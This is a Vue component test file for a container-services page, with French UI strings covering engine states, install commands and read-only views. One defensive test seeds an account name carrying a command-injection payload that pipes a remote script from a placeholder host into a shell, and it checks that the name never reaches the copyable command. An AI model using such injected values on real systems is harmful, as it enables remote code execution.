import { flushPromises, mount } from "@vue/test-utils";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { EngineDto } from "@/bindings";
import type { SimulatedLinkBridge } from "@/link";
import Services from "@/pages/Services.vue";
import { useServersStore } from "@/stores/servers";
import { useServicesStore } from "@/stores/services";
import { mountContext } from "@/test/mount";

beforeEach(() =>
  vi.useFakeTimers({
    toFake: ["setTimeout", "clearTimeout", "setInterval", "clearInterval", "Date"],
  }),
);
afterEach(() => {
  vi.useRealTimers();
  useServicesStore().reset();
});

type Engine = Partial<Omit<EngineDto, "host">> & { host?: Partial<EngineDto["host"]> };

/** La section Services d'un serveur, montée seule (la coquille et le gabarit ont leurs propres tests). */
async function open(
  setup?: (bridge: SimulatedLinkBridge) => void,
  serverId: "forge" | "salon" = "forge",
) {
  const ctx = await mountContext();
  setup?.(ctx.bridge);
  useServersStore().setCurrent(serverId);
  const wrapper = mount(Services, { global: ctx.global });
  await flushPromises();
  return { ...ctx, wrapper };
}

const NO_COMMAND = (wrapper: ReturnType<typeof mount>) =>
  expect(wrapper.find("pre").exists()).toBe(false);

describe("ouverture de la section (BR-ENGINE-001, 019)", () => {
  it("la carte du moteur est le premier bloc ; rien n'est inventé tant que rien n'est arrivé", async () => {
    const { wrapper } = await open();
    const headings = wrapper.findAll("h2").map((heading) => heading.text());
    expect(headings[0]).toBe("Moteur de conteneurs");
    expect(wrapper.text()).toContain("Vérification du moteur…");
    expect(wrapper.find("[data-services-loading]").attributes("aria-busy")).toBe("true");
    expect(wrapper.find("[role='grid']").exists()).toBe(false);
    expect(wrapper.text()).not.toContain("Aucun service pour l'instant");
    wrapper.unmount();
  });

  it("moteur prêt : nom, version, compteurs calculés depuis les états, liste triée par nom", async () => {
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [
        { key: "c_1", name: "zeta" },
        { key: "c_2", name: "Alpha", state: "stopped", neverStarted: true },
        { key: "c_3", name: "mid", state: "restart_loop", exitCode: 1, restarts10m: 4 },
        { key: "c_4", name: "bis", state: "starting" },
      ]),
    );
    expect(wrapper.find("[data-engine-state]").attributes("data-engine-state")).toBe("ready");
    expect(wrapper.text()).toContain("Prêt");
    expect(wrapper.text()).toContain("Docker Engine - Community 24.0.7");
    const counters = wrapper.findAll("ul[aria-label] li").map((item) => item.text());
    expect(counters).toEqual(["1 en marche", "1 arrêté", "1 en erreur", "1 en transition"]);
    const rows = wrapper.findAll("[data-row]");
    expect(rows.map((row) => row.attributes("data-key"))).toEqual(["c_2", "c_4", "c_3", "c_1"]);
    // La ligne « Redémarre en boucle » porte sa bande et sa hauteur.
    expect(wrapper.get("[data-key='c_3']").text()).toContain(
      "A redémarré 4 fois en 10 min. Dernier code de sortie : 1",
    );
    expect(wrapper.get("[data-key='c_2']").text()).toContain("Jamais démarré");
    expect(wrapper.find("[data-services-empty]").exists()).toBe(false);
    wrapper.unmount();
  });

  it("moteur prêt sans service : « Aucun service pour l'instant », compteurs à zéro, sans invitation (le déploiement arrive plus tard)", async () => {
    const { wrapper } = await open((bridge) => bridge.services.seed("forge", []));
    expect(wrapper.get("[data-services-empty]").text()).toBe("Aucun service pour l'instant");
    expect(wrapper.findAll("ul[aria-label] li").map((item) => item.text())).toEqual([
      "0 en marche",
      "0 arrêtés",
      "0 en erreur",
    ]);
    expect(wrapper.text()).not.toContain("Déploie");
    expect(wrapper.text()).not.toContain("Déployer");
    wrapper.unmount();
  });

  it("lecture seule : exactement les mêmes services, aucun bouton d'action sur un service", async () => {
    const services = [
      { key: "c_1", name: "web" },
      { key: "c_2", name: "base", state: "stopped" as const },
    ];
    const admin = await open((bridge) => bridge.services.seed("forge", services));
    const reader = await open((bridge) => bridge.services.seed("salon", services), "salon");
    expect(reader.wrapper.findAll("[data-row]").map((row) => row.text())).toEqual(
      admin.wrapper.findAll("[data-row]").map((row) => row.text()),
    );
    for (const wrapper of [admin.wrapper, reader.wrapper]) {
      expect(wrapper.find("[data-row] button").exists()).toBe(false);
      expect(wrapper.find("[role='menu']").exists()).toBe(false);
      expect(wrapper.text()).not.toMatch(/Démarrer|Arrêter|Redémarrer|Déployer|Ports exposés/);
    }
    admin.wrapper.unmount();
    reader.wrapper.unmount();
  });
});

const ENGINE_CASES: {
  name: string;
  engine: Engine;
  title: string;
  text: string;
  command?: string;
  readonlyNote: boolean;
}[] = [
  {
    name: "arrêté",
    engine: { state: "stopped" },
    title: "Moteur arrêté",
    text: "Le moteur de conteneurs est installé mais arrêté. S'il vient de démarrer, attends quelques secondes.",
    command: "sudo systemctl enable --now docker",
    readonlyNote: true,
  },
  {
    name: "accès refusé",
    engine: { state: "access_denied", agentAccount: "hearth", agentIsAdmin: false },
    title: "Accès refusé à l'agent",
    text: "Le moteur tourne, mais l'agent Hearth n'a pas le droit de l'utiliser. L'agent tourne sous le compte « hearth » : ce compte doit être autorisé à se servir du moteur.",
    command: "sudo usermod -aG docker hearth",
    readonlyNote: true,
  },
  {
    name: "aucun moteur détecté (Debian)",
    engine: { state: "absent", name: null, version: null },
    title: "Aucun moteur de conteneurs détecté",
    text: "Aucun moteur de conteneurs détecté. Ce serveur ne peut pas encore faire tourner de services.",
    command: "apt-get install -y docker.io",
    readonlyNote: true,
  },
];

describe.each(ENGINE_CASES)("moteur $name", ({ engine, title, text, command, readonlyNote }) => {
  it("administrateur : explication, mention d'exécution et commande à recopier", async () => {
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [{ key: "c_1", name: "web" }], engine),
    );
    expect(wrapper.text()).toContain(title);
    expect(wrapper.text()).toContain(text);
    expect(wrapper.text()).toContain("À lancer sur le serveur, pas dans Hearth");
    expect(wrapper.get("pre").text()).toContain(command ?? "");
    expect(wrapper.get("pre").attributes("aria-label")).toBe("Commande à lancer sur le serveur");
    expect(wrapper.text()).toContain("Copier la commande");
    expect(wrapper.find("[data-readonly-note]").exists()).toBe(false);
    wrapper.unmount();
  });

  it("lecture seule : la même explication, sans commande ni copie, avec la consigne", async () => {
    const { wrapper } = await open(
      (bridge) => bridge.services.seed("salon", [{ key: "c_1", name: "web" }], engine),
      "salon",
    );
    expect(wrapper.text()).toContain(title);
    expect(wrapper.text()).toContain(text);
    NO_COMMAND(wrapper);
    expect(wrapper.text()).not.toContain("Copier");
    expect(wrapper.text()).not.toContain("À lancer sur le serveur");
    expect(wrapper.find("[data-readonly-note]").exists()).toBe(readonlyNote);
    if (readonlyNote) {
      expect(wrapper.get("[data-readonly-note]").text()).toBe(
        "Demande à un administrateur de ce serveur de régler cela.",
      );
    }
    // « Vérifier à nouveau » est une lecture : elle reste proposée.
    expect(wrapper.find("[data-engine-recheck]").exists()).toBe(true);
    wrapper.unmount();
  });
});

describe("aide propre à la distribution (BR-ENGINE-005, 007, 017)", () => {
  it("NixOS : la ligne de configuration, avec la mention d'ajout, jamais une commande", async () => {
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [], {
        state: "absent",
        name: null,
        host: { osId: "nixos", declarative: true },
      }),
    );
    expect(wrapper.get("pre").text()).toBe("virtualisation.docker.enable = true;");
    expect(wrapper.text()).toContain("À ajouter sur le serveur, pas dans Hearth");
    expect(wrapper.text()).toContain("Copier le texte");
    expect(wrapper.text()).toContain("Ajouter le moteur à la configuration de ton serveur");
    expect(wrapper.text()).toContain("Ce serveur est configuré de façon déclarative");
    expect(wrapper.get("pre").text()).not.toMatch(/sudo|apt|dnf|pacman/);
    expect(wrapper.text()).toContain("Distribution détectée : nixos");
    wrapper.unmount();
  });

  it.each([
    ["debian", [], "apt-get install -y docker.io"],
    ["ubuntu", ["debian"], "apt-get install -y docker.io"],
    ["fedora", [], "dnf install -y moby-engine"],
    ["arch", [], "pacman -S docker"],
  ])("%s : la commande de sa famille", async (osId, osLike, command) => {
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [], { state: "absent", name: null, host: { osId, osLike } }),
    );
    expect(wrapper.get("pre").text()).toContain(command);
    expect(wrapper.text()).toContain(`Distribution détectée : ${osId}`);
    expect(wrapper.text()).toContain("Installer le moteur sur ton serveur");
    wrapper.unmount();
  });

  it("distribution inconnue : le renvoi à la documentation, aucune commande, le lien s'ouvre par la coquille", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", [], { state: "absent", name: null, host: { osId: "gentoo" } }),
    );
    expect(wrapper.text()).toContain(
      "Hearth ne reconnaît pas la distribution de ce serveur. Suis la documentation officielle de Docker pour ton système.",
    );
    NO_COMMAND(wrapper);
    expect(wrapper.text()).not.toContain("Distribution détectée");
    await wrapper.get("[data-engine-docs]").trigger("click");
    expect(bridge.services.docsOpened).toBe(1);
    // Même renvoi pour un compte Lecture seule : ce n'est pas une commande.
    wrapper.unmount();
  });

  it("copie : « Copié » pendant 2 secondes, et l'échec se dit sans bloquer", async () => {
    const writeText = vi.fn(async () => {});
    vi.stubGlobal("navigator", { clipboard: { writeText } });
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [], { state: "stopped" }),
    );
    await wrapper.get("[data-copy]").trigger("click");
    await flushPromises();
    expect(writeText).toHaveBeenCalledWith("sudo systemctl enable --now docker");
    expect(wrapper.get("[data-copy]").text()).toBe("Copié");
    vi.advanceTimersByTime(2000);
    await flushPromises();
    expect(wrapper.get("[data-copy]").text()).toBe("Copier la commande");
    writeText.mockRejectedValueOnce(new Error("refusé"));
    await wrapper.get("[data-copy]").trigger("click");
    await flushPromises();
    expect(wrapper.text()).toContain(
      "Impossible de copier. Sélectionne la commande et copie-la à la main.",
    );
    vi.unstubAllGlobals();
    wrapper.unmount();
  });

  it("accès refusé à un agent déjà administrateur du serveur : aucune commande, le refus vient d'ailleurs", async () => {
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [], {
        state: "access_denied",
        agentAccount: "root",
        agentIsAdmin: true,
      }),
    );
    expect(wrapper.text()).toContain(
      "qui a déjà tous les droits du serveur : ce refus vient d'un réglage de sécurité du serveur ou du moteur, que Hearth ne peut pas corriger. Vérifie la configuration de sécurité du moteur sur le serveur.",
    );
    NO_COMMAND(wrapper);
    expect(wrapper.text()).not.toContain("Copier");
    expect(wrapper.text()).not.toContain("Autoriser ce compte");
    wrapper.unmount();
  });

  it("accès refusé, nom de compte hostile : jamais dans le bloc à recopier, l'emplacement littéral à la place", async () => {
    const hostile = "x; curl evil.sh | sh";
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [], {
        state: "access_denied",
        agentAccount: hostile,
        agentIsAdmin: false,
      }),
    );
    expect(wrapper.get("pre").text()).toBe("sudo usermod -aG docker <compte-de-l-agent>");
    expect(wrapper.get("pre").text()).not.toContain("curl");
    expect(wrapper.get("[data-help-note]").text()).toContain("<compte-de-l-agent>");
    wrapper.unmount();
  });

  it("accès refusé, nom de compte valide : repris dans la commande, sans note", async () => {
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [], {
        state: "access_denied",
        agentAccount: "hearth",
        agentIsAdmin: false,
      }),
    );
    expect(wrapper.get("pre").text()).toBe("sudo usermod -aG docker hearth");
    expect(wrapper.find("[data-help-note]").exists()).toBe(false);
    wrapper.unmount();
  });

  it("accès refusé à un autre compte : l'avertissement sur les pouvoirs accordés", async () => {
    const { wrapper } = await open((bridge) =>
      bridge.services.seed("forge", [], {
        state: "access_denied",
        agentAccount: "hearth",
        agentIsAdmin: false,
      }),
    );
    expect(wrapper.text()).toContain(
      "Autoriser ce compte à se servir du moteur lui donne, en pratique, les mêmes pouvoirs que l'administrateur du serveur.",
    );
    expect(wrapper.text()).toContain("Autoriser l'agent à utiliser le moteur");
    wrapper.unmount();
  });
});

describe("autres états du moteur", () => {
  it("ne répond pas : le dernier état connu et son âge, aucune commande", async () => {
    const { wrapper, bridge } = await open((sim) => sim.services.seed("forge", []));
    vi.setSystemTime(Date.now() + 40_000);
    bridge.services.setEngine("forge", { state: "unresponsive" });
    // L'horloge de l'interface bat chaque seconde : l'âge se met à jour tout seul.
    vi.advanceTimersByTime(1000);
    await flushPromises();
    expect(wrapper.text()).toContain("Le moteur de conteneurs ne répond pas.");
    expect(wrapper.text()).toContain("Dernier état connu : Prêt, vu il y a 41 s.");
    NO_COMMAND(wrapper);
    wrapper.unmount();
  });

  it("moteur non pris en charge, version non prise en charge, pilotage désactivé : le message, ni compteur ni commande", async () => {
    const cases: [Engine, string][] = [
      [
        { state: "unsupported_engine", name: "Podman Engine" },
        "Moteur non pris en charge pour l'instant : Podman Engine. Hearth fonctionne avec Docker.",
      ],
      [
        { state: "unsupported_version", version: "19.03.5" },
        "La version 19.03.5 du moteur est trop ancienne. Hearth a besoin de la version 20.10 ou d'une version plus récente.",
      ],
      [
        { state: "disabled", name: null, version: null },
        "Le pilotage des services est désactivé sur ce serveur. Un administrateur du serveur peut le réactiver dans la configuration de l'agent Hearth.",
      ],
    ];
    for (const [engine, text] of cases) {
      const { wrapper } = await open((bridge) => bridge.services.seed("forge", [], engine));
      expect(wrapper.text()).toContain(text);
      expect(wrapper.find("ul[aria-label]").exists()).toBe(false);
      NO_COMMAND(wrapper);
      expect(wrapper.find("[data-engine-recheck]").exists()).toBe(true);
      wrapper.unmount();
    }
  });

  it("valeurs d'un agent plus récent : « État non reconnu » pour le moteur, rien d'inventé pour l'origine, le pilote et le protocole", async () => {
    const { wrapper } = await open((bridge) =>
      bridge.services.seed(
        "forge",
        [
          {
            key: "c_1",
            name: "futur",
            origin: "unknown",
            driver: "unknown",
            state: "unknown",
            ports: [{ hostPort: 4433, containerPort: 443, protocol: "unknown", scope: "unknown" }],
          },
        ],
        { state: "unknown", name: null, version: null },
      ),
    );
    expect(wrapper.get("[data-engine-state]").attributes("data-engine-state")).toBe("unknown");
    expect(wrapper.text()).toContain("État non reconnu");
    expect(wrapper.get("[data-engine-unknown]").text()).toContain(
      "Hearth ne reconnaît pas l'état du moteur",
    );
    NO_COMMAND(wrapper);
    expect(wrapper.find("[data-engine-recheck]").exists()).toBe(true);
    const row = wrapper.get("[data-key='c_1']").text();
    expect(row).toContain("4433 vers 443");
    expect(row).not.toMatch(/UNKNOWN|unknown/);
    expect(row).not.toContain("Créé hors de Hearth");
    expect(row).not.toContain("Géré par le système");
    wrapper.unmount();
  });

  it("changement d'état : annoncé une fois, le bloc d'aide disparaît au retour du moteur (BR-ENGINE-012)", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", [{ key: "c_1", name: "web" }], { state: "stopped" }),
    );
    expect(wrapper.get("[role='status'][aria-live]").text()).toBe(
      "Moteur de conteneurs : Moteur arrêté",
    );
    expect(wrapper.find("pre").exists()).toBe(true);
    bridge.services.setEngine("forge", { state: "ready" });
    await flushPromises();
    expect(wrapper.get("[role='status'][aria-live]").text()).toBe("Moteur de conteneurs : Prêt");
    expect(wrapper.find("pre").exists()).toBe(false);
    expect(wrapper.find("[data-engine-recheck]").exists()).toBe(false);
    wrapper.unmount();
  });
});

describe("liste grisée et datée quand le moteur n'est pas prêt (BR-SVC-018)", () => {
  it("lien bon : la liste précédente reste, marquée « Liste du moteur d'il y a… »", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", [
        { key: "c_1", name: "web" },
        { key: "c_2", name: "base" },
      ]),
    );
    vi.setSystemTime(Date.now() + 90_000);
    bridge.services.seed("forge", [], { state: "unresponsive" });
    // L'agent garde la liste quand le moteur ne répond pas ; ici elle est vide : la dernière lue prêt reste.
    await flushPromises();
    expect(wrapper.get("[data-services-stale]").text()).toBe("Liste du moteur d'il y a 1 min");
    expect(wrapper.findAll("[data-row]")).toHaveLength(2);
    wrapper.unmount();
  });

  it("lien coupé : un seul mécanisme, le gabarit — pas de seconde mention", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", [{ key: "c_1", name: "web" }], { state: "stopped" }),
    );
    expect(wrapper.find("[data-services-stale]").exists()).toBe(true);
    bridge.setState("forge", "offline");
    await flushPromises();
    expect(wrapper.find("[data-services-stale]").exists()).toBe(false);
    expect(wrapper.findAll("[data-row]")).toHaveLength(1);
    wrapper.unmount();
  });

  it("jamais la liste d'un autre moteur : Docker remplacé par Podman", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", [{ key: "c_1", name: "web" }]),
    );
    bridge.services.seed("forge", [], { state: "unsupported_engine", name: "Podman Engine" });
    await flushPromises();
    expect(wrapper.find("[data-row]").exists()).toBe(false);
    expect(wrapper.find("[data-services-stale]").exists()).toBe(false);
    wrapper.unmount();
  });
});

describe("liste non relisible, moteur prêt (HRT-61 list_degraded)", () => {
  const WEB = [{ key: "c_1", name: "web" }];
  const readAgo = (ms: number) => new Date(Date.now() - ms).toISOString();

  it("lien bon : « Impossible de lire les services », la liste reste, grisée et datée de la dernière lecture", async () => {
    const { wrapper } = await open((sim) =>
      sim.services.seed("forge", WEB, { listDegraded: true, listCurrentAt: readAgo(180_000) }),
    );
    expect(wrapper.get("[data-services-degraded]").text()).toContain(
      "Impossible de lire les services pour le moment.",
    );
    expect(wrapper.get("[data-services-stale]").text()).toBe("Liste du moteur d'il y a 3 min");
    expect(wrapper.find(".svc__stale--grey").exists()).toBe(true);
    expect(wrapper.findAll("[data-row]")).toHaveLength(1);
    expect(wrapper.text()).toContain("Prêt");
    wrapper.unmount();
  });

  it("sans date de l'agent : la liste est annoncée non relisible, aucune date n'est inventée", async () => {
    const { wrapper } = await open((sim) =>
      sim.services.seed("forge", WEB, { listDegraded: true, listCurrentAt: null }),
    );
    expect(wrapper.find("[data-services-degraded]").exists()).toBe(true);
    expect(wrapper.find("[data-services-stale]").exists()).toBe(false);
    expect(wrapper.findAll("[data-row]")).toHaveLength(1);
    wrapper.unmount();
  });

  it("l'agent a une autre horloge que le poste : l'âge est l'écart entre ses deux dates, jamais la différence des horloges", async () => {
    const { wrapper } = await open((sim) =>
      sim.services.seed("forge", WEB, {
        listDegraded: true,
        // L'agent est 3 h en avance : at et listCurrentAt sont à lui, 2 min d'écart.
        at: new Date(Date.now() + 3 * 3_600_000).toISOString(),
        listCurrentAt: new Date(Date.now() + 3 * 3_600_000 - 120_000).toISOString(),
      }),
    );
    expect(wrapper.get("[data-services-stale]").text()).toBe("Liste du moteur d'il y a 2 min");
    wrapper.unmount();
  });

  it("agent plus ancien (sans heure) : la date de sa dernière lecture, comme avant", async () => {
    const { wrapper } = await open((sim) =>
      sim.services.seed("forge", WEB, {
        listDegraded: true,
        at: null,
        listCurrentAt: null,
        listReadAt: readAgo(240_000),
      }),
    );
    expect(wrapper.get("[data-services-stale]").text()).toBe("Liste du moteur d'il y a 4 min");
    wrapper.unmount();
  });

  it("heure de l'agent présente et liste jamais lue : non relisible, sans âge", async () => {
    const { wrapper } = await open((sim) =>
      sim.services.seed("forge", WEB, { listDegraded: true, listCurrentAt: null }),
    );
    expect(wrapper.find("[data-services-degraded]").exists()).toBe(true);
    expect(wrapper.find("[data-services-stale]").exists()).toBe(false);
    wrapper.unmount();
  });

  it("liste vide et non relisible : jamais « Aucun service »", async () => {
    const { wrapper } = await open((sim) => sim.services.seed("forge", [], { listDegraded: true }));
    expect(wrapper.find("[data-services-degraded]").exists()).toBe(true);
    expect(wrapper.find("[data-services-empty]").exists()).toBe(false);
    wrapper.unmount();
  });

  it("lien coupé : un seul mécanisme (le gabarit), le message reste mais ni seconde date ni second filtre", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", WEB, { listDegraded: true, listCurrentAt: readAgo(60_000) }),
    );
    bridge.setState("forge", "offline");
    await flushPromises();
    expect(wrapper.find("[data-services-stale]").exists()).toBe(false);
    expect(wrapper.find(".svc__stale--grey").exists()).toBe(false);
    expect(wrapper.find("[data-services-degraded]").exists()).toBe(true);
    expect(wrapper.get("[data-services-degraded-recheck]").attributes("aria-disabled")).toBe(
      "true",
    );
    wrapper.unmount();
  });

  it("moteur non prêt : la mention du moteur non prêt seule, pas de second message", async () => {
    const { wrapper } = await open((sim) =>
      sim.services.seed("forge", WEB, {
        state: "unresponsive",
        listDegraded: true,
        listCurrentAt: readAgo(60_000),
      }),
    );
    expect(wrapper.find("[data-services-degraded]").exists()).toBe(false);
    expect(wrapper.findAll("[data-services-stale]")).toHaveLength(1);
    wrapper.unmount();
  });

  it("le retour à la normale retire le message et le filtre", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", WEB, { listDegraded: true, listCurrentAt: readAgo(60_000) }),
    );
    bridge.services.setEngine("forge", { listDegraded: false });
    await flushPromises();
    expect(wrapper.find("[data-services-degraded]").exists()).toBe(false);
    expect(wrapper.find(".svc__stale--grey").exists()).toBe(false);
    wrapper.unmount();
  });
});

describe("liaison coupée et agent ancien", () => {
  it("lien coupé sans rien reçu : ni liste ni erreur du moteur inventée (BR-ENGINE-015)", async () => {
    const { wrapper } = await open((bridge) => bridge.setState("forge", "offline"));
    expect(wrapper.text()).toContain("Aucune information pour l'instant");
    expect(wrapper.text()).not.toContain("Ne répond pas");
    expect(wrapper.find("[data-engine-state]").exists()).toBe(false);
    wrapper.unmount();
  });

  it("« Vérifier à nouveau » est désactivé lien coupé, avec la raison", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", [], { state: "stopped" }),
    );
    const button = wrapper.get("[data-engine-recheck]");
    expect(button.attributes("aria-disabled")).toBeUndefined();
    bridge.setState("forge", "offline");
    await flushPromises();
    expect(button.attributes("aria-disabled")).toBe("true");
    await button.trigger("click");
    expect(bridge.calls).not.toContain("engine recheck");
    expect(wrapper.text()).not.toContain("Ne répond pas");
    wrapper.unmount();
  });

  it("« Vérifier à nouveau » relance la détection ; l'état revient par le flux", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", [], { state: "stopped" }),
    );
    await wrapper.get("[data-engine-recheck]").trigger("click");
    await flushPromises();
    expect(bridge.calls).toContain("engine recheck");
    bridge.services.setEngine("forge", { state: "ready" });
    await flushPromises();
    expect(wrapper.find("[data-engine-recheck]").exists()).toBe(false);
    wrapper.unmount();
  });

  it("« Vérifier à nouveau » en échec : l'état devient « Ne répond pas » (spec)", async () => {
    const { wrapper, bridge } = await open((sim) =>
      sim.services.seed("forge", [], { state: "stopped" }),
    );
    bridge.services.failRecheck = true;
    await wrapper.get("[data-engine-recheck]").trigger("click");
    await flushPromises();
    const failed = wrapper.get("[data-recheck-failed]").text();
    expect(failed).toContain("Ne répond pas");
    expect(failed).toContain("Le moteur de conteneurs ne répond pas.");
    wrapper.unmount();
  });

  it("moteur arrêté sans systemd : le renvoi à la documentation, sans dire que la distribution est inconnue", async () => {
    const { wrapper } = await open((sim) =>
      sim.services.seed("forge", [], { state: "stopped", host: { init: "other" } }),
    );
    expect(wrapper.find("[data-engine-docs]").exists()).toBe(true);
    expect(wrapper.text()).not.toContain("Hearth ne reconnaît pas la distribution");
    wrapper.unmount();
  });

  it("service sur le réseau du serveur : le dit, jamais « Aucun port »", async () => {
    const { wrapper } = await open((sim) =>
      sim.services.seed("forge", [
        { key: "c_dns", name: "dns", hostNetwork: true },
        { key: "c_plain", name: "plain" },
      ]),
    );
    const dns = wrapper.get("[data-key='c_dns']");
    expect(dns.get("[data-host-network]").text()).toBe(
      "Utilise directement le réseau du serveur : aucun port individuel.",
    );
    expect(dns.text()).not.toContain("Aucun port");
    expect(dns.attributes("aria-label")).toContain("Utilise directement le réseau du serveur");
    expect(wrapper.get("[data-key='c_plain']").text()).toContain("Aucun port");
    wrapper.unmount();
  });

  it("agent sans la capacité : le message avec la version, le lien vers la mise à jour, aucune liste ni carte", async () => {
    const { wrapper } = await open((bridge) => bridge.services.setUnsupported("forge", "0.1.0"));
    const notice = wrapper.get("[data-services-old-agent]");
    expect(notice.text()).toContain(
      "Ce serveur doit être mis à jour pour gérer les services (agent 0.1.0).",
    );
    expect(notice.text()).toContain("Voir la mise à jour de l'agent");
    expect(notice.find("a").attributes("href")).toContain("settings");
    expect(wrapper.find("[data-engine-state]").exists()).toBe(false);
    expect(wrapper.find("[role='grid']").exists()).toBe(false);
    wrapper.unmount();
  });

  it("lecture de la liste en échec : le dire, et reprendre sur demande", async () => {
    const ctx = await mountContext();
    ctx.bridge.services.failSubscribe = true;
    useServersStore().setCurrent("forge");
    const wrapper = mount(Services, { global: ctx.global });
    await flushPromises();
    expect(wrapper.get("[data-services-failed]").text()).toContain(
      "Impossible de lire les services pour le moment.",
    );
    ctx.bridge.services.failSubscribe = false;
    ctx.bridge.services.seed("forge", [{ key: "c_1", name: "web" }]);
    await wrapper.get("[data-services-retry]").trigger("click");
    await flushPromises();
    expect(wrapper.find("[data-services-failed]").exists()).toBe(false);
    expect(wrapper.findAll("[data-row]")).toHaveLength(1);
    wrapper.unmount();
  });

  it("une première détection qui ne finit jamais est dite en échec au bout de 10 secondes", async () => {
    const { wrapper } = await open();
    expect(wrapper.find("[data-services-failed]").exists()).toBe(false);
    vi.advanceTimersByTime(10_000);
    await flushPromises();
    expect(wrapper.find("[data-services-failed]").exists()).toBe(true);
    wrapper.unmount();
  });
});
